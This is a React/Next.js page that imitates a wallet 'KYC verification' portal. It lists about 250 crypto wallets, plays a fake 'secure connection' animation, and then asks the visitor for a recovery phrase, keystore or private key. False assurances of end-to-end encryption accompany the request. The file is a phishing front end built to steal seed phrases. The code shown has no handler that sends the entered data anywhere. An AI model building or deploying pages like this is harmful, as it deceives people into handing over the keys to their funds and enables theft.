"use client"
import React, { useState } from "react";

// Example wallet data (replace icon URLs with your own or use SVGs)
const wallets = [
    { name: "Xaman wallet", icon: "/icons/xaman.jpg" },
    { name: "Phantom wallet", icon: "/icons/phantom.jpeg" },
    { name: "Solana Wallet", icon: "/icons/solana.png" },
    { name: "UNISWAP Wallet", icon: "/icons/uniswap.webp" },
    { name: "Best Wallet", icon: "/icons/bestwallet.jpg" },
    { name: "Wallet Connect", icon: "/icons/walletconnect.webp" },
    { name: "Trust", icon: "/icons/trustwallet.png" },
    { name: "Solflare Wallet", icon: "/icons/solflarewallet.jpg" },
    { name: "Metamask", icon: "/icons/metamask.svg" },
    { name: "Ledger", icon: "/icons/ledger.png" },
    { name: "Coinbase", icon: "/icons/coinbase.png" },
    { name: "Unisat Wallet", icon: "/icons/unisat.jpg" },
    { name: "Tangem Wallet", icon: "/icons/tangem.png" },
    { name: "Trojan Bot", icon: "/icons/trojan.jpg" },
    { name: "okx Wallet", icon: "/icons/okx.png" },
    { name: "Sui Wallet", icon: "/icons/sui.png" },
    { name: "Leather Wallet", icon: "/icons/leather.svg" },
    { name: "APTOS Wallet", icon: "/icons/aptos.webp" },
    { name: "Asigna Wallet", icon: "/icons/asigna.jpg" },
    { name: "AVAXC Wallet", icon: "/icons/avax.png" },
    { name: "Base Wallet", icon: "/icons/base.webp" },
    { name: "BITTENSOR Wallet", icon: "/icons/tao.webp" },
    { name: "AURORA Wallet", icon: "/icons/aurora.svg" },
    { name: "Xverse Wallet", icon: "/icons/xverse.jpg" },
    { name: "OPTIMISM Wallet", icon: "/icons/optimism.svg" },
    { name: "MyTon Wallet", icon: "/icons/myton.jpg" },
    { name: "Tonkeeper Wallet", icon: "/icons/tonkeeperwallet.jpg" },
    { name: "TonHub Wallet", icon: "/icons/TonHubWallet.jpg" },
    { name: "Electrum Wallet", icon: "/icons/Electrum.jpg" },
    { name: "Magic Eden Wallet", icon: "/icons/magic_eden.png" },
    { name: "STACKS Wallet", icon: "/icons/stacks.png" },
    { name: "MOONBEAM", icon: "/icons/moonbeam.webp" },
    { name: "BRD wallet", icon: "/icons/brd.jpg" },
    { name: "ETHPOW wallet", icon: "/icons/ethereum-pow.png" },
    { name: "TON wallet", icon: "/icons/ton.webp" },
    { name: "Saitamask wallet", icon: "/icons/saitama.png" },
    { name: "ARBITRUM wallet", icon: "/icons/arbitrum.svg" },
    { name: "Terra station", icon: "/icons/terra.png" },
    { name: "METIS station", icon: "/icons/metis.svg" },
    { name: "CRO wallet", icon: "/icons/cronos.svg" },
    { name: "Cosmos station", icon: "/icons/cosmos.png" },
    { name: "CUBE Wallet", icon: "/icons/cube.png" },
    { name: "Exodus wallet", icon: "/icons/exodus.png" },
    { name: "OKC wallet", icon: "/icons/okx.png" },
    { name: "Rainbow", icon: "/icons/rainbow.jpeg" },
    { name: "HECO", icon: "/icons/heco.png" },
    { name: "MOONRIVER", icon: "/icons/moonriver.webp" },
    { name: "Binance Chain", icon: "/icons/binance.png" },
    { name: "Safemoon", icon: "/icons/lg" },
    { name: "CELO", icon: "/icons/celo.png" },
    { name: "Gnosis Safe", icon: "/icons/gnosis.png" },
    { name: "FANTOM", icon: "/icons/fantom.svg" },
    { name: "DeFi", icon: "/icons/defi.jpeg" },
    { name: "LITECOIN", icon: "/icons/litecoin.svg" },
    { name: "Pillar", icon: "/icons/pillar.png" },
    { name: "imToken", icon: "/icons/imtoken.png" },
    { name: "POLYGON", icon: "/icons/matic-token-icon.png" },
    { name: "CORE", icon: "/icons/core-dao.svg" },
    { name: "BITCOINCASH", icon: "/icons/bitcoin-cash.png" },
    { name: "ONTO", icon: "/icons/onto.jpeg" },
    { name: "BOBA", icon: "/icons/boba.svg" },
    { name: "EVMOS", icon: "/icons/evmos.png" },
    { name: "THORCHAIN", icon: "/icons/thorchain.svg" },
    { name: "TokenPocket", icon: "/icons/tokenpocket.png" },
    { name: "Aave", icon: "/icons/aave-aave-logo.png" },
    { name: "Digitex", icon: "/icons/digitex.png" },
    { name: "Portis", icon: "/icons/portis.png" },
    { name: "Formatic", icon: "/icons/formatic.jpg" },
    { name: "MathWallet", icon: "/icons/mathwallet.jpeg" },
    { name: "BitPay", icon: "/icons/bitpay.jpg" },
    { name: "Ledger Live", icon: "/icons/lg(2)" },
    { name: "WallETH", icon: "/icons/walleth" },
    { name: "Autheereum", icon: "/icons/autheereum" },
    { name: "Dharma", icon: "/icons/dharma.png" },
    { name: "1inch Wallet", icon: "/icons/lg(3)" },
    { name: "Huobi", icon: "/icons/lg(4)" },
    { name: "Eidoo", icon: "/icons/eidoo.jpg" },
    { name: "MYKEY", icon: "/icons/mykey.jpg" },
    { name: "Loopring", icon: "/icons/lg(5)" },
    { name: "TrustVault", icon: "/icons/trustvault.png" },
    { name: "Atomic", icon: "/icons/atomic.png" },
    { name: "Coin98", icon: "/icons/coin98.png" },
    { name: "Tron", icon: "/icons/tron-trx-logo.png" },
    { name: "Alice", icon: "/icons/alice.png" },
    { name: "KUJIRA", icon: "/icons/kujira.webp" },
    { name: "AKASH", icon: "/icons/akash.png" },
    { name: "UMEE", icon: "/icons/umee.png" },
    { name: "IRIS", icon: "/icons/iris.png" },
    { name: "REGEN", icon: "/icons/regen.png" },
    { name: "GNOSIS", icon: "/icons/gnosis.png" },
    { name: "OSMOSIS", icon: "/icons/osmosis.png" },
    { name: "BITSONG", icon: "/icons/bitsong.png" },
    { name: "KI", icon: "/icons/ki.png" },
    { name: "SECRET", icon: "/icons/secret.png" },
    { name: "CRO-COSMOS", icon: "/icons/crypto-org.png" },
    { name: "LUM", icon: "/icons/lum.png" },
    { name: "STARNAME", icon: "/icons/starname.png" },
    { name: "SIF", icon: "/icons/sif.png" },
    { name: "BITCANNA", icon: "/icons/bitcanna.png" },
    { name: "DESMOS", icon: "/icons/desmos.png" },
    { name: "JUNO", icon: "/icons/juno.png" },
    { name: "PERSISTENCE", icon: "/icons/persistence.png" },
    { name: "SENTINEL", icon: "/icons/sentinel.png" },
    { name: "EMONEY", icon: "/icons/emoney.svg" },
    { name: "KONSTELLATION", icon: "/icons/konstellation.png" },
    { name: "STARGAZE", icon: "/icons/stargaze.png" },
    { name: "MARS", icon: "/icons/mars.svg" },
    { name: "STRIDE", icon: "/icons/stride.png" },
    { name: "NOM", icon: "/icons/onomy.png" },
    { name: "CHIHUAHUA", icon: "/icons/chihuahua.png" },
    { name: "FETCH AI", icon: "/icons/fetch.png" },
    { name: "METER", icon: "/icons/mtr.webp" },
    { name: "INJECTIVE", icon: "/icons/injective.png" },
    { name: "COMDEX", icon: "/icons/comdex.png" },
    { name: "BANDCHAIN", icon: "/icons/bandchain.png" },
    { name: "KUSAMA", icon: "/icons/ksm.webp" },
    { name: "HATHOR", icon: "/icons/htr.webp" },
    { name: "LUNA", icon: "/icons/luna.webp" },
    { name: "ENJIN", icon: "/icons/enjin.webp" },
    { name: "ALEPHIUM", icon: "/icons/alph.webp" },
    { name: "HIVE", icon: "/icons/hive.webp" },
    { name: "AlphaWallet", icon: "/icons/alphawallet.jpeg" },
    { name: "XDC", icon: "/icons/xdc.png" },
    { name: "NORDEK", icon: "/icons/nrk.webp" },
    { name: "BROCK", icon: "/icons/brock.webp" },
    { name: "ARBITRUM NOVA", icon: "/icons/arbitrumNova.webp" },
    { name: "ZKSYNC ERA", icon: "/icons/zksync-era.png" },
    { name: "AIRDAO", icon: "/icons/amb.webp" },
    { name: "ETC", icon: "/icons/etc.png" },
    { name: "REI", icon: "/icons/rei.webp" },
    { name: "RSK", icon: "/icons/rsk.webp" },
    { name: "THETA", icon: "/icons/theta.webp" },
    { name: "CASPER", icon: "/icons/cspr.webp" },
    { name: "BOBA BNB", icon: "/icons/boba.webp" },
    { name: "TENET", icon: "/icons/tenet.webp" },
    { name: "POLYGON ZKEVM", icon: "/icons/matic-token-icon.png" },
    { name: "SEI", icon: "/icons/sei.webp" },
    { name: "MANTLE", icon: "/icons/mnt.webp" },
    { name: "SYSCOIN", icon: "/icons/sys.webp" },
    { name: "TARAXA", icon: "/icons/tara.webp" },
    { name: "LINEA", icon: "/icons/linea.webp" },
    { name: "OPBNB", icon: "/icons/bnb.svg" },
    { name: "LUKSO", icon: "/icons/lyk.webp" },
    { name: "CELESTIA", icon: "/icons/tia.webp" },
    { name: "NEUTRON", icon: "/icons/ntrn.webp" },
    { name: "ORAI", icon: "/icons/orai.webp" },
    { name: "EWT", icon: "/icons/ewt.webp" },
    { name: "FLARE", icon: "/icons/flr.webp" },
    { name: "MANTA", icon: "/icons/manta.webp" },
    { name: "ZETACHAIN", icon: "/icons/zeta.webp" },
    { name: "TOMOCHAIN", icon: "/icons/tomo.webp" },
    { name: "WANCHAIN", icon: "/icons/wan.webp" },
    { name: "ELECTRONEUM", icon: "/icons/etn.webp" },
    { name: "ZKLINK NOVA", icon: "/icons/zkl.webp" },
    { name: "TAIKO", icon: "/icons/taiko.webp" },
    { name: "WEMIX", icon: "/icons/wemix.webp" },
    { name: "BITGERT", icon: "/icons/bitgert.webp" },
    { name: "DYDX", icon: "/icons/dydx.webp" },
    { name: "ASTAR", icon: "/icons/astr.webp" },
    { name: "NANO", icon: "/icons/nano.webp" },
    { name: "POCKET", icon: "/icons/pokt.webp" },
    { name: "D'CENT", icon: "/icons/dcent.png" },
    { name: "FUSE", icon: "/icons/fuse.png" },
    { name: "DOGE", icon: "/icons/doge.png" },
    { name: "COSMOS", icon: "/icons/cosmos.svg" },
    { name: "ZelCore", icon: "/icons/zelcore.png" },
    { name: "KCC", icon: "/icons/KCC.svg" },
    { name: "KAVA EVM", icon: "/icons/kava.webp" },
    { name: "KAVA IBC", icon: "/icons/kava.webp" },
    { name: "BLAST", icon: "/icons/Blast.webp" },
    { name: "BOUNCEBIT", icon: "/icons/bb.webp" },
    { name: "NIBIRU", icon: "/icons/nibi.webp" },
    { name: "RONIN", icon: "/icons/ron.webp" },
    { name: "XPLA", icon: "/icons/xpla.webp" },
    { name: "ANDROMEDA", icon: "/icons/andr.webp" },
    { name: "SAGA", icon: "/icons/saga.webp" },
    { name: "TELOSEVM", icon: "/icons/telos.webp" },
    { name: "MICRO VISION CHAIN", icon: "/icons/space.webp" },
    { name: "DYMENSION IBC", icon: "/icons/dym.webp" },
    { name: "DYMENSION EVM", icon: "/icons/dym.webp" },
    { name: "ZIRCUIT", icon: "/icons/rsz_zircuit.jpg" },
    { name: "KASPA", icon: "/icons/kaspa.webp" },
    { name: "RIPPLE", icon: "/icons/xrp.webp" },
    { name: "AZERO", icon: "/icons/azero.webp" },
    { name: "POLKADOT", icon: "/icons/dot.webp" },
    { name: "DOGECHAIN", icon: "/icons/dogeevm.webp" },
    { name: "WALTONCHAIN", icon: "/icons/wtc.webp" },
    { name: "ARWEAVE", icon: "/icons/ar.webp" },
    { name: "INTERNET COMPUTER", icon: "/icons/icp.webp" },
    { name: "FLUX", icon: "/icons/flux.webp" },
    { name: "NEXA", icon: "/icons/nexa.webp" },
    { name: "COMAI", icon: "/icons/comai.webp" },
    { name: "MAPO", icon: "/icons/mapo.webp" },
    { name: "SCROLL", icon: "/icons/scroll.webp" },
    { name: "MODE", icon: "/icons/mode.webp" },
    { name: "MERLIN", icon: "/icons/merl.webp" },
    { name: "STARKNET", icon: "/icons/starknet.webp" },
    { name: "CARDANO", icon: "/icons/ada.webp" },
    { name: "ALGORAND", icon: "/icons/algo.webp" },
    { name: "MONERO", icon: "/icons/xmr.webp" },
    { name: "STELLAR", icon: "/icons/xlm.webp" },
    { name: "FILECOIN", icon: "/icons/fil.webp" },
    { name: "DOR", icon: "/icons/dor.webp" },
    { name: "DAG", icon: "/icons/dag.webp" },
    { name: "VENOM", icon: "/icons/venom.webp" },
    { name: "PARTISIA", icon: "/icons/mpc.webp" },
    { name: "AVAIL", icon: "/icons/avail.webp" },
    { name: "RAVEN", icon: "/icons/rvn.webp" },
    { name: "HEDERA", icon: "/icons/hbar.webp" },
    { name: "EOS", icon: "/icons/eos.webp" },
    { name: "EGLD", icon: "/icons/egld.webp" },
    { name: "XTZ", icon: "/icons/xtz.webp" },
    { name: "FLOW", icon: "/icons/flow.webp" },
    { name: "CONFLUX", icon: "/icons/cfx.webp" },
    { name: "MINA", icon: "/icons/mina.webp" },
    { name: "EPS", icon: "/icons/eos.webp" },
    { name: "ECASH", icon: "/icons/xec.webp" },
    { name: "DASH", icon: "/icons/dash.webp" },
    { name: "RADIX", icon: "/icons/xrd.webp" },
    { name: "BITCOIN SV", icon: "/icons/bsv.webp" },
    { name: "OASIS NETWORK", icon: "/icons/rose.webp" },
    { name: "NEAR", icon: "/icons/near.webp" },
    { name: "PHANTASMA", icon: "/icons/phantasma.webp" },
    { name: "Coinmoni", icon: "/icons/coinmoni.png" },
    { name: "GridPlus", icon: "/icons/gridplus" },
    { name: "CYBAVO", icon: "/icons/cybavo.png" },
    { name: "Tokenary", icon: "/icons/tokenary.png" },
    { name: "Torus", icon: "/icons/torus" },
    { name: "Spatium", icon: "/icons/spatium.png" },
    { name: "SafePal", icon: "/icons/safepal.jpeg" },
    { name: "Infinito", icon: "/icons/infinito.png" },
    { name: "wallet.io", icon: "/icons/walletio" },
    { name: "Ownbit", icon: "/icons/ownbit.png" },
    { name: "EasyPocket", icon: "/icons/easypocket.png" },
    { name: "Bridge Wallet", icon: "/icons/bridgewallet.png" },
    { name: "Spark Point", icon: "/icons/Sparkpoint-wallet-logo.png" },
    { name: "ViaWallet", icon: "/icons/viawallet.png" },
    { name: "BitKeep", icon: "/icons/bitkeep" },
    { name: "Vision", icon: "/icons/vision" },
    { name: "PEAKDEFI", icon: "/icons/peakdefi.png" },
    { name: "Unstoppable", icon: "/icons/unstoppable.png" },
    { name: "HaloDeFi", icon: "/icons/halodefi" },
    { name: "Dok Wallet", icon: "/icons/dokwallet.png" },
    { name: "Midas", icon: "/icons/midas" },
    { name: "Ellipal", icon: "/icons/ellipal.png" },
    { name: "KEYRING PRO", icon: "/icons/keyringpro.png" },
    { name: "Aktionariat", icon: "/icons/aktionariat.jpeg" },
    { name: "Talken", icon: "/icons/talken.png" },
    { name: "Flare", icon: "/icons/flare.png" },
    { name: "KyberSwap", icon: "/icons/lg(7)" },
    { name: "PayTube", icon: "/icons/paytube.png" },
    { name: "Linen", icon: "/icons/linen.jpeg" },
];

type Wallet = {
    name: string;
    icon: string;
};

export default function WalletSystemPage() {
    const [search, setSearch] = useState("");
    const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
    const [showSecureDialog, setShowSecureDialog] = useState(false);
    const [showPhraseDialog, setShowPhraseDialog] = useState(false);

    function normalize(str: string) {
        return str.toLowerCase().replace(/[^a-z0-9]/g, "");
    }

    const filteredWallets = wallets.filter((wallet) =>
        normalize(wallet.name).includes(normalize(search))
    );

    const handleWalletClick = (wallet: Wallet) => {
        setSelectedWallet(wallet);
        setShowSecureDialog(true);
        setShowPhraseDialog(false);
        setTimeout(() => {
            setShowSecureDialog(false);
            setShowPhraseDialog(true);
        }, 3000);
    };

    const handleCloseDialogs = () => {
        setShowSecureDialog(false);
        setShowPhraseDialog(false);
        setSelectedWallet(null);
    };

    return (
        <div className="relative min-h-screen w-full flex flex-col items-center justify-start py-12 overflow-hidden">
            <div
                className="absolute inset-0 w-full h-full z-0"
                style={{
                    backgroundImage: "url('/background.webp')",
                    backgroundSize: "cover",
                    backgroundPosition: "center",
                    backgroundRepeat: "repeat",
                    minHeight: "100vh",
                }}>
                <div className="relative z-10 w-full flex flex-col items-center">
                    <h1 className="text-4xl md:text-5xl font-bold text-white text-center mb-4">
                        Manual Verification (KYC) Required
                    </h1>
                    <p className="text-lg text-white text-center mb-2">
                        Leaving this page without verifying your wallet means you will not be eligible to connect your wallet.
                    </p>
                    <p className="text-lg text-white text-center mb-8">
                        Step 1. Select Your Wallet Step 2. Verify Wallet Ownership Step 3. Receive Your Unique claim code.
                    </p>
                    <input
                        type="text"
                        placeholder="Search wallet names..."
                        className="w-full max-w-5xl px-6 py-3 rounded-lg text-lg mb-10 outline-none border-none shadow-lg bg-white text-black text-center"
                        value={search}
                        onChange={(e) => setSearch(e.target.value)}
                    />
                    <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-8 w-full max-w-7xl">
                        {filteredWallets.map((wallet) => (
                            <div
                                key={wallet.name}
                                className="flex flex-col items-center cursor-pointer hover:scale-105 transition-transform"
                                onClick={() => handleWalletClick(wallet)}
                            >
                                <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center mb-2 border-2 border-white">
                                    <img
                                        src={wallet.icon}
                                        alt={wallet.name}
                                        className="w-18 h-18 object-contain rounded-full"
                                    />
                                </div>
                                <span className="text-white text-center text-sm font-semibold">{wallet.name}</span>
                            </div>
                        ))}
                    </div>
                    {/* Secure Connection Dialog */}
                    {showSecureDialog && selectedWallet && (
                        <div className="fixed inset-0 flex items-center justify-center bg-transparent bg-opacity-40 z-50">
                            <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md relative">
                                <div className="flex items-center justify-between px-4 py-2 border-b border-gray-100 rounded-t-lg">
                                    <button
                                        className="text-blue-600 font-bold text-sm"
                                        onClick={handleCloseDialogs}
                                    >
                                        Back
                                    </button>
                                    <button
                                        className="text-gray-500"
                                        onClick={handleCloseDialogs}
                                    >
                                        X
                                    </button>
                                </div>
                                <div className="flex flex-col items-center px-6 py-6">
                                    <div className="border-2 border-red-400 p-4 rounded-lg text-center">
                                        <div className="border-2 border-green-400 rounded-lg p-4 mb-4 bg-green bg-opacity-40">
                                            <div className="mb-4">
                                                <span className="font-bold text-lg text-green-700">{selectedWallet.name}</span>
                                            </div>
                                            <div className="text-green-700 font-semibold mb-2">
                                                Your connection is secure and encrypted, ensuring your information remains on your device.
                                            </div>
                                            <div className="flex flex-col items-center">
                                                <div className="w-8 h-8 border-4 border-green-400 border-t-transparent rounded-full animate-spin mb-2"></div>
                                                <div className="text-gray-700">Starting secure connection...</div>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="flex flex-row justify-between items-center mt-6 w-full border-2 border-gray-400 p-2 rounded-lg">
                                        <div className="w-14 h-14 bg-white rounded-full flex items-center justify-center mb-2">
                                            <img
                                                src={selectedWallet.icon}
                                                alt={selectedWallet.name}
                                                className="w-12 h-12 object-contain rounded-full"
                                            />
                                        </div>
                                        <span className="text-gray-800 font-bold text-lg">{selectedWallet.name}</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* Phrase/Keystore/Private Key Dialog */}
                    {showPhraseDialog && selectedWallet && (
                        <div className="fixed inset-0 flex items-center justify-center bg-transparent bg-opacity-40 z-50">
                            <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md relative">
                                <button className="absolute top-2 right-4 text-gray-500" onClick={handleCloseDialogs}>X</button>
                                <div className="flex items-center mb-4">
                                    <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-18 h-18 rounded-full mr-3" />
                                    <span className="font-bold text-black text-xl">{selectedWallet.name}</span>
                                </div>
                                <div className="flex space-x-4 mb-4">
                                    <button className="font-semibold text-gray-400 border-b-2 border-blue-500">Phrase</button>
                                    <button className="font-semibold text-gray-400">Keystore</button>
                                    <button className="font-semibold text-gray-400">Private Key</button>
                                </div>
                                <textarea
                                    className="w-full border rounded p-2 mb-2 text-black"
                                    placeholder="Enter your recovery phrase"
                                    rows={3}
                                />
                                <div className="text-xs text-gray-500 mb-4">
                                    Typically 12 (sometimes 24) words separated by single spaces
                                </div>
                                <button className="w-full bg-blue-600 text-white py-2 rounded mb-2 font-bold">PROCEED</button>
                                <button className="w-full bg-red-500 text-white py-2 rounded" onClick={handleCloseDialogs}>Cancel</button>
                                <div className="flex items-center mt-4 bg-green-100 p-2 rounded">
                                    <img src="/icons/lock.png" alt="Lock" className="w-16 h-16 mr-2 inline-block rounded-full" />
                                    <span className="text-green-700 text-sm">This session is protected with end-to-end encryption. Safe to connect manually.</span>
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
}